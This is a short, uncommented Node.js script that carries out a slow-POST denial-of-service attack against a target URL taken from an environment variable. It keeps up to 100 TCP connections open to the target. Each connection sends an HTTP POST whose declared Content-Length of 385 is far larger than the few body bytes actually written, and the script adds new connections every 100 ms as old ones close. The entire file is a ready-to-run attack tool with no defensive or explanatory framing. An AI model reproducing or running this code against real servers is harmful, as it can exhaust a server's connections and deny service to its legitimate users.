var net = require('net');
var parse = require('url').parse;

var maxConnections = process.env.connections || 100;
var connections = [];

var url = process.env.url;
if (!url) {
    throw new Error('Url could not be found');
}
url = parse(url);

var host = url.hostname;
var port = process.env.port || 82;

function Connection(host, port)
{
    this.state  = 'active';
    this.timestamp = Date.now();

    this.client = net.connect({port:port, host:host}, () => {
        console.log("Connected, Sending... ");

        this.client.write("POST / HTTP/1.1\r\nHost: " + host + "\r\n" +
            "Content-Type: application/x-www-form-urlenconded\r\n" +
            "Content-Length: 385\r\n\r\nvx=321&d1=fire&l");

        console.log("Written.\n");
    });

    this.client.on('data', (data) => {
        console.log("\t-Received " + data.length + " bytes...");
        this.client.end();
    });

    this.client.on('end', () => {
        var dateDiff = Date.now() - this.timestamp;
        this.state = 'ended';

        console.log("\t-Disconnected (duration: " + (dateDiff/1000).toFixed(3) +
            " seconds, remaining open: " +
            connections.length + ")."
        );
    });

    this.client.on('error', (error) => {
        console.log(error);
        this.state = 'error';
    });

    connections.push(this);
}

setInterval(() => {
    var notify = false;

    if(connections.length < maxConnections) {
        new Connection(host, port);
        notify = true;
    }

    connections = connections.filter(function(connection) {
        return (connection.state === 'active');
    });

    if (notify) {
        console.log("Active connections: " + connections.length + " / " + maxConnections);
    }
}, 100);
